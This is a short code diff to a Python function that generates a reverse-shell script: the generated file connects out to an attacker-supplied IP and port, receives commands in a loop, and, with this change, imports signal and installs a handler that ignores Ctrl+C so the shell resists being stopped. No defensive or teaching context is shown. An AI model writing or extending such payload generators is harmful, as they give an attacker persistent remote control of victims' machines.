@@ -18,9 +18,12 @@ def PRM():
         File = open(name,'w')
         T = 'import socket'
         T += '\nimport os'
-        T += '\nimport subprocess'
+        T += '\nimport subprocess,signal'
         T += '\ns = socket.socket()'
         T += '\ns.connect((%s,%s))'%(ip,port)
+        T += '\ndef controlc_signal(signal,frame):'
+        T += '\n\tpass'
+        T += '\nsignal.signal(signal.SIGINT,controlc_signal)'
         T += '\nwhile True:'
         T += '\n\tdata = s.recv(1024)'
         T += '\n\tcd = "cd"'
